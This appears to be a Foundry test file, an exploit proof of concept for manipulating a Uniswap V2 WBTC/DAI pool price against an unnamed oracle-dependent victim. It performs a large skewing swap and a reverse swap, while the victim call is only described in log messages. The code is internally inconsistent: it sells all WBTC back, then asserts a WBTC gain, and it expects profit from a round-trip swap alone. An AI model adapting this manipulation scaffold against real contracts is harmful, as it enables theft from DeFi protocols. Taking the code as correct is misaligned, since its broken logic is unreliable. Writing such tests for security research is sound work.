// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// ERC20 Interface
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

// Uniswap V2 Interfaces
interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get tokens and interfaces

        // Label addresses for clarity
        vm.label(UNISWAP_V2_ROUTER, "UniswapV2 Router");
        vm.label(DAI, "DAI Token");
        vm.label(TARGET, "WBTC Token");

        // Give attacker initial tokens
        // Need WBTC (target) and DAI for manipulation
        deal(TARGET, attacker, 100 * 10**8); // 100 WBTC (8 decimals)
        deal(DAI, attacker, 1_000_000 * 10**18); // 1M DAI (18 decimals)
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(TARGET).balanceOf(address(this));
        uint256 initialDaiBalance = IERC20(DAI).balanceOf(attacker);

        // Get Uniswap router interface
        IUniswapV2Router02 router = IUniswapV2Router02(UNISWAP_V2_ROUTER);

        // Approve tokens for Uniswap router
        IERC20(TARGET).approve(UNISWAP_V2_ROUTER, type(uint256).max);
        IERC20(DAI).approve(UNISWAP_V2_ROUTER, type(uint256).max);

        // Get WBTC/DAI pair address
        address factory = router.factory();
        IUniswapV2Factory uniswapFactory = IUniswapV2Factory(factory);
        address pairAddress = uniswapFactory.getPair(TARGET, DAI);
        require(pairAddress != address(0), "Pair does not exist");
        vm.label(pairAddress, "WBTC/DAI Pair");

        // Get initial reserves to understand pool state
        IUniswapV2Pair pair = IUniswapV2Pair(pairAddress);
        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();

        // Determine which token is which in the pair
        address token0 = pair.token0();
        bool wbtcIsToken0 = (token0 == TARGET);

        console.log("Initial reserves:");
        console.log("Reserve0:", reserve0);
        console.log("Reserve1:", reserve1);
        console.log("Token0:", token0 == TARGET ? "WBTC" : "DAI");
        console.log("Token1:", pair.token1() == TARGET ? "WBTC" : "DAI");

        // Step 1: Manipulate price by swapping large amount of DAI for WBTC
        address[] memory path = new address[](2);
        path[0] = DAI;
        path[1] = TARGET;

        // Use significant amount to manipulate price (e.g., 500k DAI)
        uint256 manipulateAmount = 500_000 * 10**18;

        console.log("\nStep 1: Manipulating price by swapping", manipulateAmount / 10**18, "DAI for WBTC");

        // Execute swap DAI -> WBTC
        router.swapExactTokensForTokens(
            manipulateAmount,
            0, // accept any amount
            path,
            attacker,
            block.timestamp + 1 hours
        );

        console.log("Price manipulation complete");

        // Get new reserves after manipulation
        (reserve0, reserve1, ) = pair.getReserves();
        console.log("\nReserves after manipulation:");
        console.log("Reserve0:", reserve0);
        console.log("Reserve1:", reserve1);

        // Calculate price: WBTC per DAI
        uint256 wbtcPrice;
        if (wbtcIsToken0) {
            // reserve0 = WBTC, reserve1 = DAI
            wbtcPrice = uint256(reserve1) * 10**8 / reserve0;
        } else {
            // reserve0 = DAI, reserve1 = WBTC
            wbtcPrice = uint256(reserve0) * 10**8 / reserve1;
        }

        console.log("Manipulated WBTC price:", wbtcPrice, "DAI per WBTC");

        // Step 2: Here we would call the victim contract function
        console.log("\nStep 2: Exploiting victim contract (simulated)");
        console.log("At this point, we would call functions that use getPriceByWBTCDAI()");
        console.log("For example: minting synthetic assets, borrowing against collateral, etc.");

        // Step 3: Reverse the trade to restore pool and realize profit
        console.log("\nStep 3: Reversing trade to realize profit");

        // Swap WBTC back to DAI
        address[] memory reversePath = new address[](2);
        reversePath[0] = TARGET;
        reversePath[1] = DAI;

        // Get current WBTC balance
        uint256 wbtcBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("WBTC balance to swap back:", wbtcBalance / 10**8);

        // Execute reverse swap
        router.swapExactTokensForTokens(
            wbtcBalance,
            0, // accept any amount
            reversePath,
            attacker,
            block.timestamp + 1 hours
        );

        // Check final balance
        uint256 finalDaiBalance = IERC20(DAI).balanceOf(attacker);
        console.log("\nProfit calculation:");
        console.log("Initial DAI balance:", initialDaiBalance / 10**18);
        console.log("Final DAI balance:", finalDaiBalance / 10**18);
        console.log("Profit:", (finalDaiBalance - initialDaiBalance) / 10**18, "DAI");

        // Verify profit
        assertGt(finalDaiBalance, initialDaiBalance, "Attacker should profit from manipulation");
        uint256 finalBalance = IERC20(TARGET).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

